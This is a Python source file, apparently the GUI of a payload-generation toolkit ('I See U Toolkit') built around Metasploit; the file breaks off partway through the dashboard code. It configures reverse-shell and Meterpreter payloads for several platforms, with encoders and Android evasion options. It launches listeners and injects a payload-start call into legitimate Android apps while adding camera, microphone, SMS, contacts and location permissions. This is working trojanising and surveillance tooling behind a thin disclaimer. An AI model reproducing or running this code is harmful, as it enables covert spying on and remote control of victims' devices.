#!/usr/bin/env python
"""
I See U Toolkit GUI v2.0 - Modern PySide6 GUI
A complete modern GUI for the surveillance and monitoring payload generation toolkit.
DISCLAIMER: This tool is for educational and authorized security testing purposes only.
Unauthorized use of this tool for malicious purposes is illegal and unethical.
Users are responsible for obtaining proper authorization before using this tool.
"""

import os
import sys
import subprocess
import json
import logging
import argparse
import tempfile
import shutil
import zipfile
import xml.etree.ElementTree as ET
import time
import socket
import fcntl
import struct
import platform
import re
from datetime import datetime
from pathlib import Path

# PySide6 imports
from PySide6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                              QTabWidget, QLabel, QPushButton, QLineEdit, QComboBox, 
                              QCheckBox, QRadioButton, QButtonGroup, QGroupBox, QFileDialog,
                              QMessageBox, QProgressBar, QTextEdit, QScrollArea, QFrame,
                              QSplitter, QSpinBox, QFormLayout, QGridLayout, QToolBar,
                              QStatusBar, QMenuBar, QMenu, QDialog, QDialogButtonBox,
                              QSystemTrayIcon, QListWidget, QListWidgetItem, QSlider)
from PySide6.QtCore import Qt, QSize, QTimer, QThread, Signal, QSettings
from PySide6.QtGui import QIcon, QFont, QPixmap, QColor, QPalette, QAction, QKeySequence

# Python version detection
PY2 = sys.version_info[0] == 2
PY3 = sys.version_info[0] == 3

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('iseeu_toolkit.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Colors class for terminal output (simplified for GUI)
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Import the original ISeeUToolkit class (modified for Python 2/3 compatibility)
class ISeeUToolkit:
    """Advanced surveillance payload generator with proper Android support."""
    
    def __init__(self):
        self.config_file = "iseeu_config.json"
        self.output_dir = "generated_payloads"
        self.templates_dir = "templates"
        self.android_tools_dir = "android_tools"
        
        # Create necessary directories
        try:
            os.makedirs(self.output_dir, exist_ok=True)
            os.makedirs(self.templates_dir, exist_ok=True)
            os.makedirs(self.android_tools_dir, exist_ok=True)
        except:
            pass
        
        # Load or create configuration
        self.config = self.load_config()
        
        # Modern payload configurations with CORRECT Android formats
        self.payload_configs = {
            "windows": {
                "meterpreter": {
                    "staged": {
                        "reverse_tcp": "windows/x64/meterpreter/reverse_tcp",
                        "reverse_http": "windows/x64/meterpreter/reverse_http",
                        "reverse_https": "windows/x64/meterpreter/reverse_https"
                    },
                    "non_staged": {
                        "reverse_tcp": "windows/x64/meterpreter_reverse_tcp",
                        "reverse_http": "windows/x64/meterpreter_reverse_http",
                        "reverse_https": "windows/x64/meterpreter_reverse_https"
                    }
                },
                "shell": {
                    "staged": {
                        "reverse_tcp": "windows/x64/shell/reverse_tcp",
                        "reverse_http": "windows/x64/shell/reverse_http"
                    },
                    "non_staged": {
                        "reverse_tcp": "windows/x64/shell_reverse_tcp",
                        "reverse_http": "windows/x64/shell_reverse_http"
                    }
                },
                "fetch": {
                    "http": "cmd/windows/http/x64/meterpreter/reverse_tcp",
                    "https": "cmd/windows/https/x64/meterpreter/reverse_tcp"
                },
                "formats": ["exe", "exe-only", "dll", "service", "powershell"]
            },
            "linux": {
                "meterpreter": {
                    "staged": {
                        "reverse_tcp": "linux/x64/meterpreter/reverse_tcp",
                        "reverse_http": "linux/x64/meterpreter/reverse_http"
                    },
                    "non_staged": {
                        "reverse_tcp": "linux/x64/meterpreter_reverse_tcp",
                        "reverse_http": "linux/x64/meterpreter_reverse_http"
                    }
                },
                "shell": {
                    "staged": {
                        "reverse_tcp": "linux/x64/shell/reverse_tcp",
                        "reverse_http": "linux/x64/shell/reverse_http"
                    },
                    "non_staged": {
                        "reverse_tcp": "linux/x64/shell_reverse_tcp",
                        "reverse_http": "linux/x64/shell_reverse_http"
                    }
                },
                "fetch": {
                    "http": "cmd/linux/http/x64/meterpreter/reverse_tcp",
                    "https": "cmd/linux/https/x64/meterpreter/reverse_tcp"
                },
                "formats": ["elf", "elf-so", "raw"]
            },
            "android": {
                "meterpreter": {
                    "staged": {
                        "reverse_tcp": "android/meterpreter/reverse_tcp",
                        "reverse_http": "android/meterpreter/reverse_http",
                        "reverse_https": "android/meterpreter/reverse_https"
                    },
                    "non_staged": {
                        "reverse_tcp": "android/meterpreter_reverse_tcp",
                        "reverse_http": "android/meterpreter_reverse_http"
                    }
                },
                "shell": {
                    "staged": {
                        "reverse_tcp": "android/shell/reverse_tcp"
                    },
                    "non_staged": {
                        "reverse_tcp": "android/shell_reverse_tcp"
                    }
                },
                "java": {
                    "staged": {
                        "reverse_tcp": "java/meterpreter/reverse_tcp"
                    },
                    "non_staged": {
                        "reverse_tcp": "java/meterpreter_reverse_tcp"
                    }
                },
                "formats": ["apk", "raw", "elf", "elf-so"]
            },
            "macos": {
                "meterpreter": {
                    "staged": {
                        "reverse_tcp": "osx/x64/meterpreter/reverse_tcp",
                        "reverse_http": "osx/x64/meterpreter/reverse_http"
                    },
                    "non_staged": {
                        "reverse_tcp": "osx/x64/meterpreter_reverse_tcp",
                        "reverse_http": "osx/x64/meterpreter_reverse_http"
                    }
                },
                "shell": {
                    "staged": {
                        "reverse_tcp": "osx/x64/shell/reverse_tcp"
                    },
                    "non_staged": {
                        "reverse_tcp": "osx/x64/shell_reverse_tcp"
                    }
                },
                "arm": {
                    "staged": {
                        "reverse_tcp": "osx/arm64/meterpreter/reverse_tcp"
                    },
                    "non_staged": {
                        "reverse_tcp": "osx/arm64/meterpreter_reverse_tcp"
                    }
                },
                "formats": ["macho", "raw"]
            },
            "ios": {
                "meterpreter": {
                    "staged": {
                        "reverse_tcp": "ios/arm64/meterpreter/reverse_tcp"
                    },
                    "non_staged": {
                        "reverse_tcp": "ios/arm64/meterpreter_reverse_tcp"
                    }
                },
                "formats": ["raw"]
            }
        }
        
        # Android-specific configurations
        self.android_configs = {
            "target_sdk_versions": {
                "android_10": 29,
                "android_11": 30,
                "android_12": 31,
                "android_13": 33,
                "android_14": 34,
                "android_15": 35
            },
            "permissions": {
                "basic": [
                    "android.permission.INTERNET",
                    "android.permission.ACCESS_NETWORK_STATE"
                ],
                "storage": [
                    "android.permission.READ_EXTERNAL_STORAGE",
                    "android.permission.WRITE_EXTERNAL_STORAGE"
                ],
                "location": [
                    "android.permission.ACCESS_FINE_LOCATION",
                    "android.permission.ACCESS_COARSE_LOCATION"
                ],
                "camera": [
                    "android.permission.CAMERA"
                ],
                "microphone": [
                    "android.permission.RECORD_AUDIO"
                ],
                "contacts": [
                    "android.permission.READ_CONTACTS"
                ],
                "sms": [
                    "android.permission.READ_SMS",
                    "android.permission.SEND_SMS"
                ],
                "calls": [
                    "android.permission.READ_CALL_LOG",
                    "android.permission.WRITE_CALL_LOG"
                ]
            },
            "evasion_techniques": [
                "apk_wrapper",
                "permission_obfuscation",
                "native_code_embedding",
                "reflection_loading"
            ]
        }
        
        # Encoding options
        self.encoders = [
            "x86/shikata_ga_nai",
            "x64/xor_dynamic",
            "cmd/powershell_base64",
            "generic/none"
        ]
        
        # Terminal emulators to try (in order of preference)
        self.terminal_emulators = [
            "xterm",
            "gnome-terminal",
            "konsole",
            "xfce4-terminal",
            "mate-terminal",
            "lxterminal",
            "terminator"
        ]
        
        # Template files
        self.template_files = {
            "windows": ["template.exe", "template.dll"],
            "linux": ["template.elf", "template.elf-so"],
            "android": ["template.apk"]
        }
        
        # Check for required Android tools
        self.check_android_tools()
        
    def check_android_tools(self):
        """Check if required Android tools are available."""
        self.tools_available = {
            "apktool": self.which("apktool") is not None,
            "keytool": self.which("keytool") is not None,
            "jarsigner": self.which("jarsigner") is not None,
            "zipalign": self.which("zipalign") is not None
        }
        
        missing_tools = [tool for tool, available in self.tools_available.items() if not available]
        if missing_tools:
            logger.warning("Missing Android tools: {}".format(", ".join(missing_tools)))
            logger.warning("Enhanced Android payload generation may not work properly")
        else:
            logger.info("All required Android tools are available")
    
    def which(self, program):
        """Find executable in PATH (Python 2/3 compatible)."""
        import os
        def is_exe(fpath):
            return os.path.isfile(fpath) and os.access(fpath, os.X_OK)
        
        fpath, fname = os.path.split(program)
        if fpath:
            if is_exe(program):
                return program
        else:
            for path in os.environ["PATH"].split(os.pathsep):
                path = path.strip('"')
                exe_file = os.path.join(path, program)
                if is_exe(exe_file):
                    return exe_file
        return None
    
    def get_system_ip(self):
        """Automatically detect system IP address."""
        try:
            # Create a socket to determine the best IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            # Fallback method for Linux
            try:
                hostname = socket.gethostname()
                ip = socket.gethostbyname(hostname)
                return ip
            except Exception:
                # Final fallback - get all interfaces
                try:
                    for interface in [b'eth0', b'wlan0', b'wlo1', b'enp0s3']:
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            ip = socket.inet_ntoa(fcntl.ioctl(
                                s.fileno(),
                                0x8915,  # SIOCGIFADDR
                                struct.pack('256s', interface[:15])
                            )[20:24])
                            s.close()
                            if ip != '127.0.0.1':
                                return ip
                        except:
                            continue
                except:
                    pass
                return self.config.get('default_lhost', '192.168.1.100')
    
    def load_config(self):
        """Load configuration from file or create default."""
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    return json.load(f)
        except (ValueError, IOError) as e:
            logger.warning("Could not load config file: {}".format(e))
        
        # Default configuration
        return {
            "default_lhost": self.get_system_ip(),
            "default_lport": "4444",
            "default_encoder": "x86/shikata_ga_nai",
            "default_format": "exe",
            "use_template": False,
            "template_file": "",
            "iterations": 1,
            "auto_start_handler": False,
            "open_terminal_for_handler": True,
            "terminal_emulator": "auto",
            "terminal_title": "I See U Toolkit - Metasploit Handler",
            "auto_detect_ip": True,
            "payload_type_preference": "staged",
            "android_settings": {
                "target_sdk": "android_11",
                "use_wrapper": True,
                "obfuscate_permissions": True,
                "request_all_permissions": False,
                "evasion_technique": "apk_wrapper",
                "keystore_path": "mykey.keystore",
                "keystore_password": "android",
                "key_alias": "mykey",
                "key_password": "android"
            }
        }
    
    def save_config(self):
        """Save current configuration to file."""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            logger.info("Configuration saved successfully")
        except IOError as e:
            logger.error("Could not save config file: {}".format(e))
    
    def get_available_terminal(self):
        """Find an available terminal emulator."""
        if self.config.get("terminal_emulator") != "auto":
            # Check if the specified terminal is available
            terminal = self.config.get("terminal_emulator")
            if self.which(terminal):
                return terminal
            else:
                logger.warning("Specified terminal '{}' not found, falling back to auto-detection".format(terminal))
        
        # Auto-detect available terminals
        for terminal in self.terminal_emulators:
            if self.which(terminal):
                logger.info("Found terminal emulator: {}".format(terminal))
                return terminal
        
        logger.error("No suitable terminal emulator found")
        return None
    
    def start_metasploit_handler_in_terminal(self, payload, lhost, lport):
        """Start Metasploit handler in a new terminal window."""
        try:
            # Get the terminal command
            terminal = self.get_available_terminal()
            if not terminal:
                print("{}❌ No terminal emulator found. Starting in background instead.{}".format(Colors.RED, Colors.END))
                return self.start_metasploit_handler_background(payload, lhost, lport)
            
            # Build the msfconsole command
            msf_cmd = (
                "msfconsole -x "
                "'use exploit/multi/handler; "
                "set PAYLOAD {}; "
                "set LHOST {}; "
                "set LPORT {}; "
                "exploit'"
            ).format(payload, lhost, lport)
            
            # Build the terminal command based on the terminal type
            if terminal == "xterm":
                term_cmd = [
                    "xterm",
                    "-title", self.config.get("terminal_title", "Metasploit Handler"),
                    "-geometry", "120x40",
                    "-bg", "black",
                    "-fg", "green",
                    "-e", msf_cmd
                ]
            elif terminal == "gnome-terminal":
                term_cmd = [
                    "gnome-terminal",
                    "--title", self.config.get("terminal_title", "Metasploit Handler"),
                    "--geometry", "120x40",
                    "--", "bash", "-c", "{}; exec bash".format(msf_cmd)
                ]
            elif terminal == "konsole":
                term_cmd = [
                    "konsole",
                    "--title", self.config.get("terminal_title", "Metasploit Handler"),
                    "-geometry", "120x40",
                    "-e", msf_cmd
                ]
            elif terminal == "xfce4-terminal":
                term_cmd = [
                    "xfce4-terminal",
                    "--title", self.config.get("terminal_title", "Metasploit Handler"),
                    "-geometry", "120x40",
                    "-x", "bash", "-c", "{}; exec bash".format(msf_cmd)
                ]
            elif terminal == "mate-terminal":
                term_cmd = [
                    "mate-terminal",
                    "--title", self.config.get("terminal_title", "Metasploit Handler"),
                    "-geometry", "120x40",
                    "-x", "bash", "-c", "{}; exec bash".format(msf_cmd)
                ]
            elif terminal == "lxterminal":
                term_cmd = [
                    "lxterminal",
                    "--title", self.config.get("terminal_title", "Metasploit Handler"),
                    "-geometry", "120x40",
                    "-e", "bash -c '{}; exec bash'".format(msf_cmd)
                ]
            elif terminal == "terminator":
                term_cmd = [
                    "terminator",
                    "--title", self.config.get("terminal_title", "Metasploit Handler"),
                    "--geometry", "120x40",
                    "-e", "bash -c '{}; exec bash'".format(msf_cmd)
                ]
            else:
                # Fallback to generic approach
                term_cmd = [terminal, "-e", msf_cmd]
            
            logger.info("Starting Metasploit handler in {}: {}".format(terminal, " ".join(term_cmd)))
            
            # Start the terminal with the command
            subprocess.Popen(term_cmd)
            
            print("{}✅ Metasploit handler started in new {} window{}".format(Colors.GREEN, terminal, Colors.END))
            print("   {}Title: {}{}".format(Colors.CYAN, self.config.get('terminal_title', 'Metasploit Handler'), Colors.END))
            print("   {}Payload: {}{}".format(Colors.YELLOW, payload, Colors.END))
            print("   {}LHOST: {}{}".format(Colors.YELLOW, lhost, Colors.END))
            print("   {}LPORT: {}{}".format(Colors.YELLOW, lport, Colors.END))
            
            # Give it a moment to start
            time.sleep(2)
            
            return True
            
        except Exception as e:
            logger.error("Failed to start Metasploit handler in terminal: {}".format(e))
            print("{}❌ Failed to start terminal. Starting in background instead.{}".format(Colors.RED, Colors.END))
            return self.start_metasploit_handler_background(payload, lhost, lport)
    
    def start_metasploit_handler_background(self, payload, lhost, lport):
        """Start Metasploit handler in the background."""
        try:
            # Build the msfconsole command
            msf_cmd = (
                "msfconsole -x "
                "'use exploit/multi/handler; "
                "set PAYLOAD {}; "
                "set LHOST {}; "
                "set LPORT {}; "
                "exploit'"
            ).format(payload, lhost, lport)
            
            logger.info("Starting Metasploit handler in background: {}".format(msf_cmd))
            
            # Start in background
            subprocess.Popen(
                msf_cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            print("{}✅ Metasploit handler started in background{}".format(Colors.GREEN, Colors.END))
            print("   {}Payload: {}{}".format(Colors.YELLOW, payload, Colors.END))
            print("   {}LHOST: {}{}".format(Colors.YELLOW, lhost, Colors.END))
            print("   {}LPORT: {}{}".format(Colors.YELLOW, lport, Colors.END))
            print("   {}Check your processes or use 'ps aux | grep msfconsole' to verify{}".format(Colors.CYAN, Colors.END))
            
            return True
            
        except Exception as e:
            logger.error("Failed to start Metasploit handler in background: {}".format(e))
            return False
    
    def start_metasploit_handler(self, payload, lhost, lport):
        """Start Metasploit handler using the configured method."""
        if self.config.get("open_terminal_for_handler", True):
            return self.start_metasploit_handler_in_terminal(payload, lhost, lport)
        else:
            return self.start_metasploit_handler_background(payload, lhost, lport)
    
    def find_main_activity(self, manifest_path):
        """Find the main activity from AndroidManifest.xml."""
        try:
            tree = ET.parse(manifest_path)
            root = tree.getroot()
            
            # Find the activity with LAUNCHER intent filter
            for activity in root.findall(".//activity"):
                for intent_filter in activity.findall("intent-filter"):
                    for action in intent_filter.findall("action"):
                        if action.get("name") == "android.intent.action.MAIN":
                            for category in intent_filter.findall("category"):
                                if category.get("name") == "android.intent.category.LAUNCHER":
                                    return activity.get("name")
            
            return None
        except Exception as e:
            logger.error("Error parsing AndroidManifest.xml: {}".format(e))
            return None
    
    def inject_payload_startup(self, smali_path):
        """Inject payload startup code into the main activity smali file."""
        try:
            with open(smali_path, 'r') as f:
                content = f.read()
            
            # Find the onCreate method
            onCreate_pattern = r'\.method protected onCreate\(Landroid/os/Bundle;\)V'
            match = re.search(onCreate_pattern, content)
            
            if not match:
                print("{}❌ Could not find onCreate method in {}{}".format(Colors.RED, smali_path, Colors.END))
                return False
            
            # Find the position after super.onCreate call
            super_pattern = r'invoke-super \{p[0-9]\}, Landroid/app/Activity;->onCreate\(Landroid/os/Bundle;\)V'
            super_match = re.search(super_pattern, content[match.end():])
            
            if not super_match:
                print("{}❌ Could not find super.onCreate call in {}{}".format(Colors.RED, smali_path, Colors.END))
                return False
            
            # Calculate the position to insert the payload startup code
            insert_pos = match.end() + super_match.end()
            
            # Insert the payload startup code
            payload_code = "\n\n    invoke-static {}, Lcom/metasploit/stage/Payload;->start()V\n"
            new_content = content[:insert_pos] + payload_code + content[insert_pos:]
            
            # Write the modified content back to the file
            with open(smali_path, 'w') as f:
                f.write(new_content)
            
            return True
        except Exception as e:
            logger.error("Error injecting payload startup code: {}".format(e))
            return False
    
    def modify_android_manifest(self, manifest_path, permissions):
        """Add required permissions and service to AndroidManifest.xml."""
        try:
            tree = ET.parse(manifest_path)
            root = tree.getroot()
            
            # Add required permissions
            existing_permissions = set()
            for perm in root.findall("uses-permission"):
                existing_permissions.add(perm.get("name"))
            
            # Always add internet permission if not present
            if "android.permission.INTERNET" not in existing_permissions:
                perm = ET.Element("uses-permission")
                perm.set("android:name", "android.permission.INTERNET")
                root.insert(0, perm)
            
            # Add selected permissions
            for perm_group in permissions:
                if perm_group in self.android_configs["permissions"]:
                    for perm_name in self.android_configs["permissions"][perm_group]:
                        if perm_name not in existing_permissions:
                            perm = ET.Element("uses-permission")
                            perm.set("android:name", perm_name)
                            root.insert(0, perm)
            
            # Add the payload service
            application = root.find("application")
            if application is not None:
                # Check if service already exists
                service_exists = False
                for service in application.findall("service"):
                    if service.get("name") == "com.metasploit.stage.Payload":
                        service_exists = True
                        break
                
                if not service_exists:
                    service = ET.Element("service")
                    service.set("android:name", "com.metasploit.stage.Payload")
                    service.set("android:enabled", "true")
                    service.set("android:exported", "false")
                    application.append(service)
            
            # Write the modified manifest back
            tree.write(manifest_path, encoding="utf-8", xml_declaration=True)
            
            return True
        except Exception as e:
            logger.error("Error modifying AndroidManifest.xml: {}".format(e))
            return False
    
    def execute_command(self, command):
        """Execute the msfvenom command safely."""
        try:
            logger.info("Executing command: {}".format(command))
            
            if PY3:
                # Python 3 - use subprocess.run
                result = subprocess.run(
                    command,
                    shell=True,
                    check=True,
                    capture_output=True,
                    text=True,
                    timeout=300  # 5 minute timeout
                )
                
                if result.returncode == 0:
                    logger.info("Payload generated successfully")
                    if result.stdout:
                        logger.info("Output: {}".format(result.stdout))
                    return True
                else:
                    logger.error("Command failed with return code {}".format(result.returncode))
                    logger.error("Error: {}".format(result.stderr))
                    return False
            else:
                # Python 2 - use subprocess.call
                result = subprocess.call(
                    command,
                    shell=True,
                    timeout=300  # 5 minute timeout
                )
                
                if result == 0:
                    logger.info("Payload generated successfully")
                    return True
                else:
                    logger.error("Command failed with return code {}".format(result))
                    return False
                
        except subprocess.TimeoutExpired:
            logger.error("Command timed out")
            return False
        except Exception as e:
            logger.error("Unexpected error: {}".format(e))
            return False
    
    def sanitize_input(self, input_str, input_type="general"):
        """Sanitize user input based on type."""
        if not isinstance(input_str, str):
            raise ValueError("Input must be a string")
        
        input_str = input_str.strip()
        
        if input_type == "ip":
            # Basic IP validation
            parts = input_str.split('.')
            if len(parts) != 4 or not all(part.isdigit() and 0 <= int(part) <= 255 for part in parts):
                raise ValueError("Invalid IP address format")
        elif input_type == "port":
            if not input_str.isdigit() or not (1 <= int(input_str) <= 65535):
                raise ValueError("Port must be between 1 and 65535")
        elif input_type == "filename":
            # Remove dangerous characters
            dangerous_chars = ['/', '\\', ':', '*', '?', '"', '<', '>', '|']
            for char in dangerous_chars:
                input_str = input_str.replace(char, '')
            if not input_str:
                raise ValueError("Filename cannot be empty after sanitization")
        
        return input_str

# Worker thread for command execution
class CommandWorker(QThread):
    finished = Signal(bool, str)
    progress = Signal(int)
    status = Signal(str)
    
    def __init__(self, command):
        super().__init__()
        self.command = command
    
    def run(self):
        try:
            self.status.emit(f"Executing: {self.command}")
            
            result = subprocess.run(
                self.command,
                shell=True,
                check=True,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            if result.returncode == 0:
                self.finished.emit(True, result.stdout if result.stdout else "Success")
            else:
                self.finished.emit(False, result.stderr)
                
        except subprocess.TimeoutExpired:
            self.finished.emit(False, "Command timed out")
        except Exception as e:
            self.finished.emit(False, str(e))

# Modern GUI using PySide6
class ModernISeeUGUI(QMainWindow):
    """Modern GUI for the I See U Toolkit with PySide6."""
    
    def __init__(self):
        super().__init__()
        
        # Set up the toolkit
        self.toolkit = ISeeUToolkit()
        
        # Set window properties
        self.setWindowTitle("I See U Toolkit v2.0")
        self.setMinimumSize(1200, 800)
        
        # Set application style
        self.setup_modern_style()
        
        # Create central widget and layout
        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        self.main_layout = QVBoxLayout(self.central_widget)
        
        # Create widgets
        self.create_menu_bar()
        self.create_toolbar()
        self.create_main_content()
        self.create_status_bar()
        
        # Load settings
        self.settings = QSettings("ISeeUToolkit", "v2.0")
        self.load_window_settings()
        
        # Update status
        self.status_bar.showMessage(f"Ready. Default LHOST: {self.toolkit.config.get('default_lhost', '192.168.1.100')}")
    
    def setup_modern_style(self):
        """Configure modern styling for the GUI."""
        # Set application palette for dark theme
        palette = QPalette()
        palette.setColor(QPalette.Window, QColor(30, 30, 46))
        palette.setColor(QPalette.WindowText, QColor(224, 224, 224))
        palette.setColor(QPalette.Base, QColor(45, 45, 68))
        palette.setColor(QPalette.AlternateBase, QColor(37, 37, 55))
        palette.setColor(QPalette.ToolTipBase, QColor(30, 30, 46))
        palette.setColor(QPalette.ToolTipText, QColor(224, 224, 224))
        palette.setColor(QPalette.Text, QColor(224, 224, 224))
        palette.setColor(QPalette.Button, QColor(45, 45, 68))
        palette.setColor(QPalette.ButtonText, QColor(224, 224, 224))
        palette.setColor(QPalette.BrightText, QColor(255, 0, 0))
        palette.setColor(QPalette.Link, QColor(93, 95, 239))
        palette.setColor(QPalette.Highlight, QColor(93, 95, 239))
        palette.setColor(QPalette.HighlightedText, QColor(0, 0, 0))
        self.setPalette(palette)
        
        # Set application font
        app_font = QFont("Segoe UI", 10)
        QApplication.setFont(app_font)
        
        # Set stylesheet
        self.setStyleSheet("""
            QMainWindow {
                background-color: #1E1E2E;
            }
            
            QWidget {
                background-color: #1E1E2E;
                color: #E0E0E0;
            }
            
            QTabWidget::pane {
                border: 1px solid #3A3A4F;
                background-color: #252537;
            }
            
            QTabBar::tab {
                background-color: #2D2D44;
                color: #B0B0B0;
                padding: 10px 20px;
                border: none;
                margin-right: 2px;
            }
            
            QTabBar::tab:selected {
                background-color: #5D5FEF;
                color: white;
            }
            
            QTabBar::tab:hover {
                background-color: #3D3D5F;
            }
            
            QPushButton {
                background-color: #2D2D44;
                border: 1px solid #3A3A4F;
                color: #E0E0E0;
                padding: 8px 16px;
                border-radius: 4px;
                font-weight: bold;
            }
            
            QPushButton:hover {
                background-color: #3D3D5F;
            }
            
            QPushButton:pressed {
                background-color: #5D5FEF;
            }
            
            QLineEdit, QComboBox, QTextEdit {
                background-color: #2D2D44;
                border: 1px solid #3A3A4F;
                padding: 8px;
                border-radius: 4px;
            }
            
            QLineEdit:focus, QComboBox:focus, QTextEdit:focus {
                border: 1px solid #5D5FEF;
            }
            
            QGroupBox {
                border: 1px solid #3A3A4F;
                border-radius: 4px;
                margin-top: 10px;
                padding-top: 10px;
            }
            
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
            
            QCheckBox, QRadioButton {
                spacing: 8px;
            }
            
            QProgressBar {
                border: 1px solid #3A3A4F;
                border-radius: 4px;
                text-align: center;
                background-color: #2D2D44;
            }
            
            QProgressBar::chunk {
                background-color: #5D5FEF;
            }
            
            QMenuBar {
                background-color: #252537;
                color: #E0E0E0;
            }
            
            QMenuBar::item:selected {
                background-color: #5D5FEF;
            }
            
            QMenu {
                background-color: #252537;
                color: #E0E0E0;
            }
            
            QMenu::item:selected {
                background-color: #5D5FEF;
            }
            
            QStatusBar {
                background-color: #252537;
                color: #B0B0B0;
            }
            
            QToolBar {
                background-color: #252537;
                border: none;
                spacing: 5px;
            }
            
            QToolButton {
                background-color: transparent;
                border: none;
                padding: 5px;
            }
            
            QToolButton:hover {
                background-color: #3D3D5F;
                border-radius: 4px;
            }
            
            QListWidget {
                background-color: #2D2D44;
                border: 1px solid #3A3A4F;
                border-radius: 4px;
            }
            
            QListWidget::item {
                padding: 8px;
            }
            
            QListWidget::item:selected {
                background-color: #5D5FEF;
            }
        """)
    
    def create_menu_bar(self):
        """Create the menu bar."""
        menubar = self.menuBar()
        
        # File menu
        file_menu = menubar.addMenu("File")
        
        exit_action = QAction("Exit", self)
        exit_action.setShortcut(QKeySequence.Quit)
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)
        
        # Edit menu
        edit_menu = menubar.addMenu("Edit")
        
        settings_action = QAction("Settings", self)
        settings_action.triggered.connect(lambda: self.tab_widget.setCurrentIndex(5))
        edit_menu.addAction(settings_action)
        
        reset_action = QAction("Reset Settings", self)
        reset_action.triggered.connect(self.reset_settings)
        edit_menu.addAction(reset_action)
        
        # View menu
        view_menu = menubar.addMenu("View")
        
        log_action = QAction("Show Log", self)
        log_action.triggered.connect(self.show_log_window)
        view_menu.addAction(log_action)
        
        # Help menu
        help_menu = menubar.addMenu("Help")
        
        about_action = QAction("About", self)
        about_action.triggered.connect(self.show_about_dialog)
        help_menu.addAction(about_action)
        
        docs_action = QAction("Documentation", self)
        docs_action.triggered.connect(self.show_documentation)
        help_menu.addAction(docs_action)
    
    def create_toolbar(self):
        """Create the toolbar."""
        toolbar = QToolBar()
        toolbar.setIconSize(QSize(24, 24))
        self.addToolBar(toolbar)
        
        # Add actions
        generate_action = QAction("Generate", self)
        generate_action.triggered.connect(lambda: self.tab_widget.setCurrentIndex(1))
        toolbar.addAction(generate_action)
        
        inject_action = QAction("Inject", self)
        inject_action.triggered.connect(lambda: self.tab_widget.setCurrentIndex(2))
        toolbar.addAction(inject_action)
        
        listen_action = QAction("Listen", self)
        listen_action.triggered.connect(lambda: self.tab_widget.setCurrentIndex(4))
        toolbar.addAction(listen_action)
        
        toolbar.addSeparator()
        
        log_action = QAction("Log", self)
        log_action.triggered.connect(self.show_log_window)
        toolbar.addAction(log_action)
        
        settings_action = QAction("Settings", self)
        settings_action.triggered.connect(lambda: self.tab_widget.setCurrentIndex(5))
        toolbar.addAction(settings_action)
    
    def create_main_content(self):
        """Create the main content area."""
        # Create tab widget
        self.tab_widget = QTabWidget()
        self.main_layout.addWidget(self.tab_widget)
        
        # Create tabs
        self.create_dashboard_tab()
        self.create_traditional_payload_tab()
        self.create_android_injection_tab()
        self.create_fetch_payload_tab()
        self.create_multi_format_tab()
        self.create_listener_tab()
        self.create_settings_tab()
    
    def create_dashboard_tab(self):
        """Create the dashboard tab."""
        dashboard_widget = QWidget()
        self.tab_widget.addTab(dashboard_widget, "Dashboard")
        
        layout = QVBoxLayout(dashboard_widget)
        
        # Header
        header_label = QLabel("I See U Toolkit v2.0")
        header_label.setAlignment(Qt.AlignCenter)
        header_label.setStyleSheet("font-size: 24px; font-weight: bold; color: #7B7FF5; margin: 20px;")
        layout.addWidget(header_label)
        
        subtitle_label = QLabel("Advanced Payload Generation Toolkit")
        subtitle_label.setAlignment(Qt.AlignCenter)
        subtitle_label.setStyleSheet("font-size: 16px; color: #E0E0E0; margin-bottom: 20px;")
        layout.addWidget(subtitle_label)
        
        # Banner
        banner = QTextEdit()
        banner.setReadOnly(True)
        banner.setMaximumHeight(150)
        banner.setStyleSheet("""
            QTextEdit {
                background-color: #2D2D44;
                border: 1px solid #3A3A4F;
                border-radius: 4px;
                font-family: 'Consolas';
                font-size: 12px;
            }
        """)
        banner.setPlainText("""
╔══════════════════════════════════════════════════════════════╗
║                    I SEE U TOOLKIT v2.0                       ║
║                                                              ║
║     ███████╗ ███████╗ ███████╗                                ║
║     ██╔════╝ ██╔════╝ ██╔════╝                                ║
║     ███████╗ ██████╗  ██████╗                                 ║
║     ╚════██║ ██╔══╝  ██╔══╝                                  ║
║     ███████║ ███████╗ ███████╗                                ║
║     ╚══════╝ ╚══════╝ ╚══════╝                                ║
║                                                              ║
║          Modern Payload Generation with AI Assistance         ║
║        Auto IP Detection & Advanced Terminal Handling        ║
╚══════════════════════════════════════════════════════════════╝
        """)
        layout.addWidget(banner)
        
        # Quick actions grid
        actions_widget = QWidget()
        actions_layout = QGridLayout(actions_widget)
        layout.addWidget(actions_widget)
        
        actions = [
            ("Generate Traditional Payload", "Create standard payloads for various platforms", 
             lambda: self.tab_widget.setCurrentIndex(1), "🚀"),
            ("Inject Payload into APK", "Embed payloads into Android applications", 
             lambda: self.tab_widget.setCurrentIndex(2), "📱"),
            ("Generate Fetch Payload", "Create payloads that fetch and execute remotely", 
             lambda: self.tab_widget.setCurrentIndex(3), "🌐"),
            ("Generate Multi-Format Payload", "Create payloads in multiple formats", 
             lambda: self.tab_widget.setCurrentIndex(4), "📦"),
            ("Start Meterpreter Listener", "Launch a listener for incoming connections", 
             lambda: self.tab_widget.setCurrentIndex(5), "🎧"),
            ("Configure Settings", "Customize toolkit preferences", 
             lambda: self.tab_widget.setCurrentIndex(6), "⚙️")
        ]
        
        for i, (title, desc, command, icon) in enumerate(actions):
